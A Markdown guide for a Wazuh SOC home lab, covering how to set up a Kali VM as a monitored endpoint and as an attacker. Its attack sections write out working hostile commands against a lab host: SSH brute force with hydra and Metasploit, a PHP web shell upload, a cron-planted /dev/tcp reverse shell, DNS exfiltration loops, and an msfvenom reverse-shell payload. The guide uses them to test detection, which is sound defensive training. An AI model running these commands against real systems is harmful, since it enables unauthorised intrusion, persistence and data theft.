# Kali Linux Integration Guide

Complete guide to integrate your existing Kali Linux VM into the SOC Monitoring Lab as both an **attacker** and a **monitored endpoint**.

---

## Overview

| Role | Purpose |
|------|---------|
| **Attacker** | Launch attack simulations from Kali against Ubuntu Agent |
| **Monitored Endpoint** | Wazuh Agent on Kali sends its own logs to SIEM (see your attacks in Dashboard) |

---

## Phase 1: Add Internal Network NIC

### In VirtualBox Manager
1. **Shutdown** Kali VM completely (not saved state)
2. Select Kali VM → **Settings** → **Network**
3. **Adapter 2** tab:
   - ✅ Enable Network Adapter
   - Attached to: **Internal Network**
   - Name: **intnet** (exact match, case-sensitive)
   - Adapter Type: Intel PRO/1000 MT Desktop (82540EM)
   - Promiscuous Mode: Allow All (for Suricata visibility)
4. Click **OK**
5. **Start** Kali VM

### Verify New Interface
```bash
# In Kali terminal
ip link show
# Look for new interface (usually eth1, ens8, or enp0s8)
```

---

## Phase 2: Configure Static IP on intnet

### Identify Interface Name
```bash
# Typical names:
# eth1, ens8, enp0s8, enp0s9
ip -br link show | grep -v lo
```

### Configure Static IP (Debian/Kali style)
```bash
# Replace 'eth1' with your actual interface name
INTERFACE="eth1"

sudo tee /etc/network/interfaces.d/${INTERFACE} > /dev/null <<EOF
auto ${INTERFACE}
iface ${INTERFACE} inet static
    address 10.10.10.30
    netmask 255.255.255.0
    # No gateway needed for internal network
EOF

# Apply
sudo systemctl restart networking
# OR if using NetworkManager:
sudo nmcli con reload
sudo nmcli con up "${INTERFACE}"
```

### Verify
```bash
ip addr show ${INTERFACE}
# Should show: inet 10.10.10.30/24

# Test connectivity to Manager
ping -c 3 10.10.10.10
ping -c 3 10.10.10.11
ping -c 3 10.10.10.12
ping -c 3 10.10.10.20
```

### Make Persistent Across Reboots
```bash
# If using NetworkManager (default on Kali), ensure it manages the interface
sudo nmcli device set ${INTERFACE} managed yes

# Verify on reboot:
# Add to /etc/rc.local or use systemd service
sudo tee /etc/systemd/system/kali-intnet-static.service > /dev/null <<'EOF'
[Unit]
Description=Kali intnet Static IP
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c "ip addr add 10.10.10.30/24 dev eth1 || true"
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable kali-intnet-static
# Note: Adjust 'eth1' to your interface name
```

---

## Phase 3: Install Wazuh Agent on Kali

### Method 1: Repository (Recommended)
```bash
# Add Wazuh repository
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor | sudo tee /usr/share/keyrings/wazuh.gpg > /dev/null
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list

sudo apt update
sudo apt install wazuh-agent=4.9.2-1
```

### Method 2: Direct DEB Download
```bash
cd /tmp
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.2-1_amd64.deb
sudo dpkg -i wazuh-agent_4.9.2-1_amd64.deb
```

### Configure Agent
```bash
# Edit ossec.conf to point to Manager
sudo tee -a /var/ossec/etc/ossec.conf > /dev/null <<'EOF'
<client>
  <server>
    <address>10.10.10.10</address>
    <port>1514</port>
    <protocol>tcp</protocol>
  </server>
  <config-profile>kali,linux</config-profile>
  <notify_time>10</notify_time>
  <time-reconnect>60</time-reconnect>
  <auto_restart>yes</auto_restart>
</client>
EOF
```

---

## Phase 4: Enroll Agent to Manager

### On Manager (wazuh-manager) - Start Auth Daemon
```bash
# SSH to Manager
ssh socadmin@10.10.10.10

# Start agent-auth (runs in foreground, keep this terminal open)
sudo /var/ossec/bin/agent-auth -m 10.10.10.10 -p 1515 -v
# Output: "Waiting for connections on port 1515..."
```

### On Kali - Enroll
```bash
# In NEW terminal on Kali
sudo /var/ossec/bin/agent-auth -m 10.10.10.10 -p 1515 -A kali-linux

# Expected output:
# 2026/09/13 10:30:15 agent-auth: INFO: Connected to 10.10.10.10
# 2026/09/13 10:30:15 agent-auth: INFO: Agent enrolled successfully
# 2026/09/13 10:30:15 agent-auth: INFO: Agent key: <key>
```

### Start Agent on Kali
```bash
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent

# Verify
sudo systemctl status wazuh-agent
sudo /var/ossec/bin/agent_control -l
```

### Verify in Dashboard
1. Open Dashboard: `https://10.10.10.12:5601`
2. Navigate: **Agents**
3. Should see: `kali-linux` → **Active** (green)

---

## Phase 5: Configure Log Collection on Kali

### Add Kali-Specific Logs
```bash
sudo tee -a /var/ossec/etc/ossec.conf > /dev/null <<'EOF'
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/syslog</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/kern.log</location>
</localfile>
<localfile>
  <log_format>journalctl</log_format>
  <location>systemd</location>
</localfile>
<localfile>
  <log_format>audit</log_format>
  <location>/var/log/audit/audit.log</location>
</localfile>
EOF

sudo systemctl restart wazuh-agent
```

### Enable Auditd (for detailed syscall monitoring)
```bash
sudo apt install -y auditd audispd-plugins
sudo systemctl enable auditd
sudo systemctl start auditd

# Add rules for monitoring
sudo auditctl -w /etc/passwd -p wa -k identity
sudo auditctl -w /etc/shadow -p wa -k identity
sudo auditctl -w /etc/sudoers -p wa -k sudoers
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec

# Make persistent
sudo tee /etc/audit/rules.d/kali.rules > /dev/null <<'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-a always,exit -F arch=b64 -S execve -k exec
EOF

sudo systemctl restart auditd
```

---

## Phase 6: Run Attack Simulations

### Prepare Attack Scripts
```bash
# On Kali, clone or copy the attack-scenarios folder
cd /opt
sudo git clone https://github.com/HariomRaut/SOC-Monitoring-Lab.git
cd SOC-Monitoring-Lab/attack-scenarios
chmod +x *.sh
```

### Attack 1: SSH Brute Force
```bash
# Target: Ubuntu Agent (10.10.10.20)
./ssh-bruteforce.sh

# Manual alternative:
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz 10.10.10.20 ssh -t 4 -V -f

# Expected: Rule 100001 + 5712 alerts in Dashboard
```

### Attack 2: Web Shell Upload
```bash
# Requires web server on Ubuntu Agent (see SETUP.md)
./webshell-upload.sh

# Manual:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" http://10.10.10.20/upload.php

# Expected: Rule 100003 + 31151 alerts
```

### Attack 3: Sudo Abuse
```bash
# On Ubuntu Agent first (as socadmin):
# echo "socadmin ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/test

./sudo-abuse.sh

# Manual:
for i in {1..5}; do ssh socadmin@10.10.10.20 "sudo whoami"; sleep 2; done

# Expected: Rule 100002 + 5402 alerts

# CLEANUP on Ubuntu Agent:
# ssh socadmin@10.10.10.20 "sudo rm /etc/sudoers.d/test"
```

### Attack 4: Cron Persistence
```bash
# On Ubuntu Agent (as root via ssh):
ssh socadmin@10.10.10.20 "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/10.10.10.30/4444 0>&1\"' | sudo tee /etc/cron.d/evil"

./cron-persistence.sh

# Expected: Rule 100004 + 530 alerts

# CLEANUP:
ssh socadmin@10.10.10.20 "sudo rm /etc/cron.d/evil"
```

### Attack 5: DNS Exfiltration
```bash
# Option A: dnscat2 (full C2)
# Requires dnscat2 server on Kali first:
# git clone https://github.com/iagox86/dnscat2.git
# cd dnscat2/server && gem install bundler && bundle install
# ruby dnscat2.rb --dns="server=10.10.10.30,port=53" --secret=secret

# Option B: High-volume DNS queries (simpler)
./dns-exfil.sh

# Manual:
for i in {1..100}; do
  dig @10.10.10.11 "exfil-$i.$RANDOM.example.com" +short
  sleep 0.1
done

# Expected: Rule 100005 + 87001 alerts
```

---

## Phase 7: Verify Attacks in Dashboard

### Security Events View
1. Dashboard → **Security Events**
2. Time range: **Last 15 minutes**
3. Filter by rule:
   ```
   rule.id: 100001 OR 100002 OR 100003 OR 100004 OR 100005
   ```

### Agent-Specific Views
- Filter by `agent.name: kali-linux` → See Kali's own logs
- Filter by `agent.name: ubuntu-agent` → See Ubuntu logs

### MITRE ATT&CK Dashboard
1. Open **MITRE ATT&CK Coverage** dashboard
2. Check techniques triggered:
   - T1110.001 (SSH Brute Force)
   - T1548.003 (Sudo Abuse)
   - T1505.003 (Web Shell)
   - T1053.003 (Cron)
   - T1048 (DNS Exfiltration)

---

## Phase 8: Kali as Attacker - Advanced Tools

### Metasploit Framework
```bash
# Start MSF console
msfconsole

# Example: Exploit vs Ubuntu Agent
use exploit/linux/ssh/ssh_login
set RHOSTS 10.10.10.20
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt.gz
set THREADS 4
run
```

### Nmap Scanning
```bash
# Stealth scan
nmap -sS -T4 10.10.10.20

# Service detection
nmap -sV -sC 10.10.10.20

# Vulnerability scripts
nmap --script vuln 10.10.10.20
```

### BloodHound / SharpHound (if AD environment)
```bash
# Not applicable in this lab (no AD)
# But Kali has tools pre-installed for AD environments
```

### Custom Payload Generation
```bash
# msfvenom for custom payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f elf > payload.elf

# Transfer to Ubuntu Agent and execute
scp payload.elf socadmin@10.10.10.20:/tmp/
ssh socadmin@10.10.10.20 "chmod +x /tmp/payload.elf && /tmp/payload.elf"
```

---

## Troubleshooting

### Agent Won't Enroll
```bash
# Check Manager auth daemon running
ssh socadmin@10.10.10.10 "ps aux | grep agent-auth"

# Check firewall on Manager
ssh socadmin@10.10.10.10 "sudo ufw status"

# Check connectivity from Kali
telnet 10.10.10.10 1515
# OR
nc -zv 10.10.10.10 1515
```

### Agent Shows "Never Connected"
```bash
# On Kali
sudo systemctl status wazuh-agent
tail -f /var/ossec/logs/ossec.log

# Common: Wrong manager IP in ossec.conf
grep -A5 "<server>" /var/ossec/etc/ossec.conf

# Fix and restart
sudo systemctl restart wazuh-agent
```

### No Logs from Kali in Dashboard
```bash
# Check agent is active
curl -k -u wazuh-wui:PASS https://10.10.10.10:55000/agents?name=kali-linux

# Check agent logs being sent
tail -f /var/ossec/logs/ossec.log | grep "Forwarding"

# Restart agent
sudo systemctl restart wazuh-agent
```

### Network Issues
```bash
# Verify intnet interface up
ip link show eth1

# Verify IP
ip addr show eth1

# Test routing
ip route show
# Should have: 10.10.10.0/24 dev eth1 proto kernel scope link src 10.10.10.30

# If missing, add manually:
sudo ip route add 10.10.10.0/24 dev eth1
```

---

## Quick Reference Commands

| Task | Command |
|------|---------|
| Check agent status | `sudo /var/ossec/bin/agent_control -l` |
| Restart agent | `sudo systemctl restart wazuh-agent` |
| View agent logs | `tail -f /var/ossec/logs/ossec.log` |
| Test rule matching | `sudo /var/ossec/bin/wazuh-logtest` |
| Enroll agent | `sudo /var/ossec/bin/agent-auth -m 10.10.10.10 -A kali-linux` |
| Run all attacks | `cd /opt/SOC-Monitoring-Lab/attack-scenarios && ./run-all.sh` |
| Check Dashboard | Open `https://10.10.10.12:5601` |

---

## Run All Attacks Script

Create `/opt/SOC-Monitoring-Lab/attack-scenarios/run-all.sh`:
```bash
#!/bin/bash
set -e

echo "=== Running All Attack Scenarios ==="
echo "Target: Ubuntu Agent (10.10.10.20)"
echo "Attacker: Kali (10.10.10.30)"
echo ""

./ssh-bruteforce.sh
sleep 5

./webshell-upload.sh
sleep 5

./sudo-abuse.sh
sleep 5

./cron-persistence.sh
sleep 5

./dns-exfil.sh

echo ""
echo "=== All attacks completed ==="
echo "Check Dashboard: https://10.10.10.12:5601"
echo "Filter: rule.id: 100001 OR 100002 OR 100003 OR 100004 OR 100005"
```

```bash
chmod +x /opt/SOC-Monitoring-Lab/attack-scenarios/run-all.sh
```

---

## Next Steps

1. **Customize attacks** — Modify scripts for your environment
2. **Add Windows agent** — Deploy Wazuh Agent on Windows VM
3. **Build more rules** — See [RULES.md](RULES.md)
4. **Create dashboards** — See [DASHBOARDS.md](DASHBOARDS.md)
5. **Document findings** — Update `docs/` with your results

---

*See also: [SETUP.md](SETUP.md) for full lab deployment, [RUNBOOK.md](RUNBOOK.md) for daily operations*